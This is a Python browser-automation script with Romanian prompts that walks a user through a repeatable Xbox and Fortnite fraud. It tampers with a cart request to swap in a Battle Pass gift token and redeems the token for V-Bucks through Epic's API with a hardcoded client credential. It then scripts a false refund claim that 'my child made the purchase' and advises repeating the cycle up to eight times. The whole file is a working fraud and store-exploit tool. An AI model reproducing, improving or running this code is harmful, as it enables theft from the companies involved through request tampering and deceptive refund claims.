import time
import json
import requests
import os
import platform
import subprocess
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.edge.options import Options as EdgeOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.microsoft import EdgeChromiumDriverManager
from webdriver_manager.chrome import ChromeDriverManager

# URLs based on the tutorial
XBOX_APEX_URL = "https://www.xbox.com/en-ZA/games/store/apex-legends-1000-apex-coins/9n5qmznw4bt1"
XBOX_CART_URL = "https://www.xbox.com/en-ZA/cart"
XBOX_FORTNITE_CLOUD_URL = "https://www.xbox.com/en-US/play/launch/fortnite/BT5P2X999VH2"
EPIC_AUTH_LINK = "https://epicgames.com/id/api/redirect"
XBOX_REFUND_URL = "https://support.xbox.com/pt-br/help/subscriptions-billing/buy-games-apps/refund-orders"

# Profile paths - auto-detect OS
if platform.system() == "Windows":
    USERNAME = os.getenv('USERNAME', 'asksk')
    EDGE_PROFILE_PATH = rf"C:\Users\{USERNAME}\AppData\Local\Microsoft\Edge\User Data\Profile 1"
    CHROME_PROFILE_PATH = rf"C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Profile 1"
    EDGE_USER_DATA = rf"C:\Users\{USERNAME}\AppData\Local\Microsoft\Edge\User Data"
    CHROME_USER_DATA = rf"C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data"
else:
    EDGE_PROFILE_PATH = "/workspace/.config/microsoft-edge/Profile 1"
    CHROME_PROFILE_PATH = "/workspace/.config/google-chrome/Profile 1"
    EDGE_USER_DATA = "/workspace/.config/microsoft-edge"
    CHROME_USER_DATA = "/workspace/.config/google-chrome"

def setup_browser():
    """Setup browser with existing profile and auto-install drivers"""
    try:
        # Try Edge first
        if os.path.exists(EDGE_USER_DATA):
            print(f"[+] Using Edge browser with existing profile: {EDGE_PROFILE_PATH}")
            edge_options = EdgeOptions()
            edge_options.add_argument(f"--user-data-dir={EDGE_USER_DATA}")
            edge_options.add_argument("--profile-directory=Profile 1")
            edge_options.add_argument("--no-first-run")
            edge_options.add_argument("--no-default-browser-check")
            edge_options.add_argument("--disable-popup-blocking")
            edge_options.add_experimental_option("detach", True)
            edge_options.add_experimental_option("useAutomationExtension", False)
            edge_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            
            # Auto-install Edge driver
            driver_path = EdgeChromiumDriverManager().install()
            return webdriver.Edge(service=webdriver.edge.service.Service(driver_path), options=edge_options)
        
        # Fallback to Chrome
        elif os.path.exists(CHROME_USER_DATA):
            print(f"[+] Using Chrome browser with existing profile: {CHROME_PROFILE_PATH}")
            chrome_options = ChromeOptions()
            chrome_options.add_argument(f"--user-data-dir={CHROME_USER_DATA}")
            chrome_options.add_argument("--profile-directory=Profile 1")
            chrome_options.add_argument("--no-first-run")
            chrome_options.add_argument("--no-default-browser-check")
            chrome_options.add_argument("--disable-popup-blocking")
            chrome_options.add_experimental_option("detach", True)
            chrome_options.add_experimental_option("useAutomationExtension", False)
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            
            # Auto-install Chrome driver
            driver_path = ChromeDriverManager().install()
            return webdriver.Chrome(service=webdriver.chrome.service.Service(driver_path), options=chrome_options)
        
        else:
            print("[+] Using default Edge browser...")
            edge_options = EdgeOptions()
            edge_options.add_experimental_option("detach", True)
            driver_path = EdgeChromiumDriverManager().install()
            return webdriver.Edge(service=webdriver.edge.service.Service(driver_path), options=edge_options)
            
    except Exception as e:
        print(f"[!] Error setting up browser: {e}")
        print("[+] Trying with default Edge browser...")
        edge_options = EdgeOptions()
        edge_options.add_experimental_option("detach", True)
        driver_path = EdgeChromiumDriverManager().install()
        return webdriver.Edge(service=webdriver.edge.service.Service(driver_path), options=edge_options)

def open_dev_tools_and_add_to_cart(driver):
    """Add Apex to cart and capture network request for modification"""
    print("[+] Opening Apex product page...")
    driver.get(XBOX_APEX_URL)
    time.sleep(8)
    
    print("[+] INSTRUCȚIUNI MANUALE:")
    print("    1. Apasă F12 pentru a deschide Developer Tools")
    print("    2. Mergi la tab-ul 'Network'")
    print("    3. Adaugă pack-ul în coș")
    print("    4. Caută cererea 'loadcart' în Network")
    print("    5. Click dreapta pe 'loadcart' → Copy → Copy as fetch")
    print("    6. Deschide scriptul fetch modifier și modifică fetch-ul")
    print("    7. Execută fetch-ul modificat în consolă")
    print("    8. Apasă Enter aici pentru a continua...")
    
    input("Apasă Enter după ce ai executat fetch-ul modificat...")
    
    return True

def go_to_cart_and_purchase(driver):
    """Navigate to cart, remove original, purchase token"""
    print("[+] Opening shopping cart...")
    driver.get(XBOX_CART_URL)
    time.sleep(8)
    
    print("[+] INSTRUCȚIUNI CART:")
    print("    1. Șterge pack-ul original Apex din coș")
    print("    2. Trebuie să rămână doar 'Fortnite - C6 Star Wars Battle Pass Gift Token'")
    print("    3. Finalizează achiziția cu Microsoft balance")
    print("    4. Apasă Enter aici după ce ai completat achiziția...")
    
    input("Apasă Enter după ce ai completat achiziția...")
    
    return True

def launch_fortnite_cloud(driver):
    """Launch Fortnite via Xbox Cloud Gaming"""
    print("[+] Opening Fortnite Cloud Gaming...")
    driver.get(XBOX_FORTNITE_CLOUD_URL)
    time.sleep(20)
    
    print("[+] INSTRUCȚIUNI FORTNITE:")
    print("    1. Așteaptă să se încarce Fortnite")
    print("    2. După ce te conectezi în joc, poți ieși")
    print("    3. Apasă Enter aici pentru a continua cu redemptia...")
    
    input("Apasă Enter după ce ai ieșit din Fortnite...")
    
    return True

def run_main_py_option_4():
    """Run the main.py script option 4 for BP token exchange"""
    print("[+] Rulează main.py pentru exchange BP tokens...")
    
    # Create the main.py content based on tutorial
    main_py_content = '''import requests
import os
import json
import time

def get_access_token():
    url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
    headers = {
        "Authorization": "basic M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU=",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    auth_code = input("Enter your authorization code: ")

    data = {
        "grant_type": "authorization_code",
        "code": auth_code
    }

    response = requests.post(url, headers=headers, data=data)
    response_data = response.json()

    if 'access_token' in response_data:
        access_token = response_data['access_token']
        account_id = response_data.get('account_id', None)
        if account_id:
            print("Account ID:", account_id)
        else:
            print("Incorrect authorization code")
        print("Access Token:", access_token)
        return access_token, account_id
    else:
        print("Access Token not found in response")
        return None, None

def get_device_info(access_token, account_id):
    if access_token and account_id:
        device_auth_url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}/deviceAuth"
        device_auth_headers = {
            "Authorization": f"Bearer {access_token}"
        }

        device_auth_response = requests.post(device_auth_url, headers=device_auth_headers)
        device_auth_response_data = device_auth_response.json()

        if 'deviceId' in device_auth_response_data:
            deviceId = device_auth_response_data['deviceId']
            print("Device ID:", deviceId)
        else:
            print("Device ID not found in deviceAuth response")
        if 'secret' in device_auth_response_data:
            secret = device_auth_response_data['secret']
            print("Secret:", secret)
        else:
            print("Secret not found in deviceAuth response")
        return deviceId, secret
    return None, None

def exchange_bp_token(access_token, account_id):
    """Exchange Battle Pass token for V-Bucks"""
    while True:
        url = f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/ExchangeGiftToken?profileId=athena"
        body = {}
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {access_token}"
        }

        response = requests.post(url, headers=headers, json=body)
        if response.status_code == 200:
            print("Successfully exchanged BP token for 950 V-Bucks")
            return True
        else:
            print("Failed to exchange BP token")
            print(f"Response: {response.text}")
            return False

def main():
    print("Exchange BP Tokens")
    access_token, account_id = get_access_token()
    
    if access_token and account_id:
        device_id, secret = get_device_info(access_token, account_id)
        if account_id and device_id and secret:
            success = exchange_bp_token(access_token, account_id)
            if success:
                print("[✔] V-Bucks exchange completed successfully!")
            else:
                print("[✘] V-Bucks exchange failed!")
    else:
        print("Failed to get access token")

if __name__ == "__main__":
    main()
'''
    
    # Write main.py file
    with open('main.py', 'w') as f:
        f.write(main_py_content)
    
    print("[+] main.py creat! Acum îl rulăm...")
    
    # Get Epic auth code first
    print("[+] Deschid Epic auth link pentru authorization code...")
    driver.get(EPIC_AUTH_LINK)
    time.sleep(10)
    
    # Try to auto-extract auth code
    max_attempts = 6
    auth_code = None
    for attempt in range(max_attempts):
        current_url = driver.current_url
        print(f"[+] Current URL (attempt {attempt+1}): {current_url[:100]}...")
        
        if "authorizationCode=" in current_url:
            auth_code = current_url.split("authorizationCode=")[1].split("&")[0]
            print(f"[✓] Auto-extracted auth code: {auth_code[:20]}...")
            break
        elif "code=" in current_url:
            auth_code = current_url.split("code=")[1].split("&")[0]
            print(f"[✓] Auto-extracted auth code: {auth_code[:20]}...")
            break
        
        time.sleep(5)
    
    if not auth_code:
        print("[!] Could not auto-extract auth code")
        print(f"[!] Final URL: {driver.current_url}")
        auth_code = input("Paste the authorizationCode: ").strip()
    
    # Now run the exchange
    if auth_code:
        print("[+] Rulează exchange cu authorization code...")
        success = exchange_bp_token_direct(auth_code)
        return success
    else:
        print("[!] No authorization code available")
        return False

def exchange_bp_token_direct(auth_code):
    """Direct BP token exchange function"""
    print("[+] Getting Epic access token...")
    token_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
    token_headers = {
        "Authorization": "basic M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU=",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    token_data = {
        "grant_type": "authorization_code",
        "code": auth_code
    }
    
    try:
        response = requests.post(token_url, headers=token_headers, data=token_data).json()
        access_token = response.get("access_token")
        account_id = response.get("account_id")
        
        if not access_token or not account_id:
            print("[✘] Failed to get Epic access token.")
            print(f"Response: {response}")
            return False
        
        print(f"[✓] Got access token for account: {account_id}")
        print("[+] Exchanging BP token for 950 V-Bucks...")
        
        redeem_url = f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/ExchangeGiftToken?profileId=athena"
        redeem_headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json"
        }
        redeem_response = requests.post(redeem_url, headers=redeem_headers, json={})
        
        if redeem_response.status_code == 200:
            print("[✔] BP token exchanged successfully - 950 V-Bucks added!")
            return True
        else:
            print(f"[✘] Failed to exchange BP token: {redeem_response.status_code}")
            print(f"Response: {redeem_response.text}")
            return False
            
    except Exception as e:
        print(f"[✘] Error during exchange: {e}")
        return False

def open_refund_page_with_form(driver):
    """Open Xbox refund page with specific instructions"""
    print("[+] Opening Xbox refund page...")
    driver.get(XBOX_REFUND_URL)
    time.sleep(8)
    
    print("[+] INSTRUCȚIUNI REFUND:")
    print("    1. Selectează 'Fortnite - C6 Star Wars Battle Pass Gift Token'")
    print("    2. Reason: 'Não fiz a compra'")
    print("    3. Person: 'Meu filho' (My child)")
    print("    4. For reason put: 'Meu filho fez a compra e eu preciso de um reembolso, por favor'")
    print("    5. Submit request")
    print("    6. Apasă Enter aici după ce ai trimis cererea...")
    
    input("Apasă Enter după ce ai trimis cererea de refund...")
    
    return True

def create_fetch_modifier():
    """Create the fetch modifier script"""
    fetch_modifier_content = '''import tkinter as tk

def modify_fetch_code():
    # Get the input fetch code from the text box
    fetch_code = fetch_code_input.get("1.0", tk.END).strip()

    # Replace ONLY the old productId with the new one
    modified_code = fetch_code.replace('9N5QMZNW4BT1', '9PLKMR36KR4Z')

    # Replace the word "include" with "omit"
    modified_code = modified_code.replace('include', 'omit')

    # Display the modified code in the output text box
    fetch_code_output.delete("1.0", tk.END)
    fetch_code_output.insert(tk.END, modified_code)

def copy_to_clipboard():
    root.clipboard_clear()
    root.clipboard_append(fetch_code_output.get("1.0", tk.END).strip())

def clear_input_box():
    fetch_code_input.delete("1.0", tk.END)

# Create the main application window
root = tk.Tk()
root.title("Fetch Code Modifier")

# Input Text Box
fetch_code_input = tk.Text(root, height=10, width=80)
fetch_code_input.pack(pady=10)

# Modify Button
modify_button = tk.Button(root, text="Modify Fetch Code", command=modify_fetch_code)
modify_button.pack(pady=5)

# Output Text Box
fetch_code_output = tk.Text(root, height=10, width=80)
fetch_code_output.pack(pady=10)

# Copy Button
copy_button = tk.Button(root, text="Copy to Clipboard", command=copy_to_clipboard)
copy_button.pack(pady=5)

# Clear Button
clear_button = tk.Button(root, text="Clear Input", command=clear_input_box)
clear_button.pack(pady=5)

# Start the GUI
root.mainloop()
'''
    
    with open('fetch_modifier.py', 'w') as f:
        f.write(fetch_modifier_content)
    
    print("[+] fetch_modifier.py creat!")

def main():
    """Main automation function"""
    driver = None
    try:
        print("=== FORTNITE V-BUCKS AUTOMATION (CORRECTED) ===")
        print(f"[+] Running on {platform.system()}")
        print("[+] Starting browser automation...")
        
        # Create helper scripts
        create_fetch_modifier()
        
        # Setup browser
        driver = setup_browser()
        driver.maximize_window()
        
        print("\n🛒 STEP 4: Buy Token")
        # Step 1: Add Apex to cart and capture network request
        open_dev_tools_and_add_to_cart(driver)
        
        print("\n📦 STEP 4.5: Purchase Token")
        # Step 2: Go to cart and purchase token
        go_to_cart_and_purchase(driver)
        
        print("\n🎮 STEP 5: Claim Token")
        # Step 3: Launch Fortnite cloud gaming
        launch_fortnite_cloud(driver)
        
        print("\n💰 STEP 6: Redeem Token")
        # Step 4: Exchange BP tokens
        exchange_success = run_main_py_option_4()
        
        if exchange_success:
            print("[✔] V-Bucks exchange completed successfully!")
            
            # Launch Fortnite again to verify V-Bucks
            print("[+] Launching Fortnite again to verify V-Bucks...")
            launch_fortnite_cloud(driver)
        else:
            print("[✘] V-Bucks exchange failed!")
        
        print("\n↩️ STEP 7: Refund Token")
        # Step 5: Refund process
        open_refund_page_with_form(driver)
        
        print("\n🔄 STEP 8: Rinse and Repeat")
        print("📋 Pentru a repeta procesul:")
        print("  1. Verifică 'Status do reembolso' pe pagina de refund")
        print("  2. Așteaptă ca refund-ul să fie aprobat")
        print("  3. După aprobare, reia de la Step 4")
        print("  4. Poți face acest proces de 8 ori pentru 7600 V-Bucks max per Xbox")
        
        print("\n🎉 [✔] Automation completed!")
        print("🌐 Browser will remain open for manual verification.")
        
        # Keep browser open for manual review
        input("\nPress Enter to close browser and exit...")
        
    except KeyboardInterrupt:
        print("\n[!] Automation interrupted by user")
        
    except Exception as e:
        print(f"\n[✘] Error during automation: {e}")
        import traceback
        traceback.print_exc()
        
    finally:
        if driver:
            try:
                driver.quit()
                print("[+] Browser closed successfully")
            except:
                pass

if __name__ == "__main__":
    main()